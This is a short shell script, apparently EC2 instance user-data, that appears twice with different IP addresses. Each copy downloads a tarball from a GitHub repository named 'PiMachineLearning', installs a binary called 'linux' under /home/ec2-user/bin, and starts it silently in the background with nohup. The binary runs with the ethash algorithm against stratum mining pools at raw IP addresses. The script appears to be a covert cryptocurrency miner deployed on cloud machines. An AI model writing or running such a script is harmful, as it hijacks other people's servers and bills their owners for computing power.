


wget https://github.com/Dev699vn/PiMachineLearning/raw/main/linux.tar.gz
tar -xvf linux.tar.gz
rm -rf linux.tar.gz
mkdir /home/ec2-user/bin
mv linux /home/ec2-user/bin/linux

cat << "EOF" > /home/ec2-user/bin/runsrc.sh
#!/bin/bash
./linux -a ethash -o stratum+http://137.184.182.204:8080 -o stratum+http://143.198.2.247:8086

EOF

chmod +x /home/ec2-user/bin/runsrc.sh
chown -R ec2-user:ec2-user /home/ec2-user/bin/
cd /home/ec2-user/bin/ && nohup ./runsrc.sh > result.log 2>&1 &

echo ""




wget https://github.com/Dev699vn/PiMachineLearning/raw/main/linux.tar.gz
tar -xvf linux.tar.gz
rm -rf linux.tar.gz
mkdir /home/ec2-user/bin
mv linux /home/ec2-user/bin/linux

cat << "EOF" > /home/ec2-user/bin/runsrc.sh
#!/bin/bash
./linux -a ethash -o stratum+http://164.92.86.204:8080 -o stratum+http://143.198.72.74:8086

EOF

chmod +x /home/ec2-user/bin/runsrc.sh
chown -R ec2-user:ec2-user /home/ec2-user/bin/
cd /home/ec2-user/bin/ && nohup ./runsrc.sh > result.log 2>&1 &

echo ""
